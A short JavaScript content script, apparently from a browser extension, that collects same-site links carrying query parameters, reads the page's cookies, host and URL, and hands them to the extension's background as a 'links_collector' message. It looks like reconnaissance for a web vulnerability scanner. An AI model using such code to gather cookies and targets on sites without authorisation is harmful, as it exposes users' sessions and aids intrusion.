var Target_reg = new RegExp("[\?|0-9|=|&]"); 
var Target_links = new Array();
AllLinks = document.getElementsByTagName("a");
for(var i=0,len =AllLinks.length;i<len;i++){
	href = AllLinks[i].getAttribute("href");
	if(AllLinks[i].hostname == location.hostname && Target_reg.test(href)){
		Target_links.push(AllLinks[i].href);	
	}
}
Cookie = document.cookie;
Host = window.location.host; 
Url = window.location.href;
var Info = {
		type : "links_collector",
		target_links : Target_links,
		cookis : Cookie,
		host : Host,
		url : Url
}
chrome.runtime.sendMessage(Info);
